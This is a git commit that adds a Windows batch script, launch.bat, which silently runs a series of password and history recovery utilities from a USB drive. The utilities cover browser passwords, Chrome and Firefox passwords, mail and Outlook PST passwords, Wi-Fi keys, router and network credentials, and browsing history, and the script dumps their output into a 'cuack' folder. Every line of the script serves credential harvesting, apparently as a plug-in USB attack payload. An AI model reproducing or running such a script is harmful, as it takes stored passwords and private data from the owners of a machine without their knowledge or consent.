71b3e7b63feab94773cf773eafa371a425fa12db
pepa <91153189+pepaoing@users.noreply.github.com>
2022-04-26 09:46:41 +0200

    Add files via upload

---
+++ launch.bat
@@ -0,0 +1,22 @@
+echo @off
+
+cd usb path
+
+start BrowserDownloadsView.exe /stext cuack\BrowserDownloadsView.txt
+start BrowsingHistoryView.exe /stext cuack\BrowsingHistoryView.txt
+start BulletsPassView.exe /stext cuack\BulletsPassView.txt
+start ChromeHistoryView.exe /stext cuack\ChromeHistoryView.txt
+start ChromePass.exe /stext cuack\ChromePass.txt
+start Dialupass.exe /stext cuack\Dialupass.txt
+start FBCacheView.exe /stext cuack\FBCacheView.txt
+start iepv.exe /stext cuack\iepv.txt
+start mailpv.exe /stext cuack\mailpv.txt
+start netpass.exe /stext cuack\netpass.txt
+start OperaPassView.exe /stext cuack\OperaPassView.txt
+start PasswordFox.exe /stext cuack\PasswordFox.txt
+start ProcessTCPSummary.exe /stext cuack\ProcessTCPSummary.txt
+start PstPassword.exe /stext cuack\PstPassword.txt
+start RouterPassView.exe /stext cuack\RouterPassView.txt
+start WebBrowserPassView.exe /stext cuack\WebBrowserPassView.txt
+start WifiHistoryView.exe /stext cuack\WifiHistoryView.txt
+start WirelessKeyView.exe /stext cuack\WirelessKeyView.txt
